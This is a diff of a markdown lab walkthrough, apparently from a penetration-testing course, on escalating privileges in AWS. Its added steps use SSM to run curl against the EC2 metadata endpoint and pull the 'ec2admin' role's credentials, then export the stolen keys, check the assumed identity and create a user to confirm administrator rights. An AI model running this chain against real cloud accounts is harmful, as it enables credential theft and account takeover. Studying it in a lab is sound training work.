@@ -51,18 +51,28 @@ Start an ec2 instance using collected details. `aws ec2 run-instances --subnet-i
 
 ![image](https://user-images.githubusercontent.com/46797181/222877971-1bafeef4-d464-4bdb-899c-69be1178e1db.png)
 
-Run commands on the remote ec2 instance using SSM. `aws ssm send-command \
---document-name "AWS-RunShellScript" \
---parameters 'commands=["curl
-http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2admin/"]' \
---targets "Key=instanceids,Values=i-0aa5cdcaf86dec148" \
---comment "aws cli 1"
+Run commands on the remote ec2 instance using SSM. `aws ssm send-command --document-name "AWS-RunShellScript" --parameters 'commands=["curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2admin/"]' --targets "Key=instanceids,Values=i-0a4021bfebd564014" --comment "aws cli 1 --profile PTAcademyJllerena"`
 
+ ![image](https://user-images.githubusercontent.com/46797181/222878360-d734c9b0-9547-4602-99ee-685d627e65d3.png)
+ 
+Get the command’s output using SSM. `aws ssm get-command-invocation --command-id "2caa2511-3e5b-4717-bb8e-5502ca79b548" --instance-id "i-0a4021bfebd564014" --profile PTAcademyJllerena`
 
+![image](https://user-images.githubusercontent.com/46797181/222878455-d79536e6-238b-4cd1-971e-2548882f9e43.png)
 
+Take note of the access keys and configure the env variables 
 
+```
+export AWS_ACCESS_KEY_ID=<access key id>
+export AWS_SECRET_ACCESS_KEY=<secret access key>
+export AWS_SESSION_TOKEN=<session token>
 
+```
 
+Check caller identity to confirm whether assuming role was successful. `aws sts get-caller-identity`
+![image](https://user-images.githubusercontent.com/46797181/222878679-c097f7ef-23ce-4e30-b9e7-237ff23e40a9.png)
+
+Try creating a new user on the AWS account to verify Administrative privileges
+![image](https://user-images.githubusercontent.com/46797181/222878713-1f698443-99cd-4940-8c3d-26b829549759.png)
 
 
 
